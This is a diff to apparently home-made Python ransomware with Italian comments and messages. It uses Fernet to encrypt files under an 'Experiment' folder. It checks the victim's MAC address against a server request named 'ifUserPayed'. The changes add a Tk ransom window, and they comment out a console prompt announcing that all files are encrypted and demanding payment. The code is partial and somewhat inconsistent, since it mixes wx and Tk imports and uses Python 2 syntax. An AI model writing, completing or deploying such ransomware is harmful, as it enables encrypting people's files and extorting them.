@@ -3,8 +3,11 @@ import requests
 from uuid import getnode as get_mac
 from cryptography.fernet import Fernet
 
+import wx
 
 import request
+from window import *
+
 
 def key_generation(key_path):
     # Put this somewhere safe!
@@ -78,12 +81,17 @@ root_path = '.\Experiment'
 # usala per crittare tutto
 condition = False
 
+url = ""
+data = {"r": "Test"}
+
+req = request.Request(url, data)
+
 if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
     # 1) Request "ifUserPayed(MACAddress)"
     # 2) if True Decrypt everything
 
     # Create the Request
-    req = {"r": "ifUserPayed", "MAC": mac}
+    req = {"r": "IfUserPayed", "MAC": mac}
     # Send the request...and store the response here
     resp = True
 
@@ -120,7 +128,7 @@ if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
 
 
 else:
-    # 1) Request "newUser(MACAddress)" return Key
+    # 1) Request "CheckMAC(MACAddress)" return Key
     # 2) crypt everything
 
     if not os.path.isfile("check.check"):
@@ -145,8 +153,15 @@ else:
 
         write_file("check.check", "")
 
+    finestra = Tk()
+    app = Application(finestra)
+    finestra.mainloop()
+
+
+    """
     var = raw_input("TUTTI I TUOI FILE SONO CRITTATI! VUOI PAGARE 1000MILA SOLDI?")
     if var.lower() == "si":
         # Send to Server Payment Request
         remove_file("check.check")
         print "SAGGIA SCELTA. FAI RIPARTIRE IL PROGRAMMA PER DECRITTARE TUTTO"
+    """
